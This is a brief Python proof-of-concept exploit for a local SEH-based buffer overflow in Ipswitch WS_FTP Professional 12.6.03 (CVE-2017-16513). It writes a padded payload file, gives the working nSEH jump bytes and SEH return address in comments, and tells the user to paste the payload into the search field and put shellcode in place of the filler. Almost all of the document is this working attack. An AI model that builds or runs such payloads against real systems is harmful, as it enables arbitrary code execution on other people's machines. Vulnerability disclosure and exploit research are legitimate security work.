#!/usr/bin/python
#Title: Ipswitch WS_FTP Professional Local Buffer Overflow (SEH)
#Author: Kevin McGuigan. Twitter: @_h3xagram
#Author Website: https://www.7elements.co.uk
#Vendor Website: https://www.ipswitch.com
#Date: 03/11/2017
#Version: 12.6.03
#CVE: CVE-2017-16513
#Tested on: Windows 7 32-bit
#Use script to generate payload. Paste payload into search field, replace Ds with shellcode. 
#nSEH = "\x74\x08\x90\x90" 
#SEH = "\x31\x2D\x91\x23"

buffer = "A" * 840
nSEH = "B" * 4
SEH = "C" * 4


f = open ("poc.txt", "w")
f.write(buffer + nSEH + SEH + "D" * 200)
f.close()